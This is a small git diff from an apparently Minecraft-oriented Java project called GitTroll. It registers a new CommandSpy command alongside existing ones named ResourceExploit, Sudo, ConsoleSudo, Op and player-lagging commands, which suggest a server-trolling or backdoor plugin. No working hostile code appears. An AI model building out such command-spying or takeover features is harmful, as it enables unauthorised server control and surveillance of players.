@@ -26,6 +26,7 @@ import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeePlayerLagger;
 import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeePlayerList;
 import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeeRedirect;
 import net.Lenni0451.GitTroll.command.commands.exploits.ResourceExploit;
+import net.Lenni0451.GitTroll.command.commands.player.CommandSpy;
 import net.Lenni0451.GitTroll.command.commands.player.Deop;
 import net.Lenni0451.GitTroll.command.commands.player.Heal;
 import net.Lenni0451.GitTroll.command.commands.player.Op;
@@ -102,6 +103,7 @@ public class CommandManager implements Listener {
 	public final ChunkRenderGlitch ChunkRenderGlitch = null;
 	public final Sudo Sudo = null;
 	public final ConsoleSudo ConsoleSudo = null;
+	public final CommandSpy CommandSpy = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
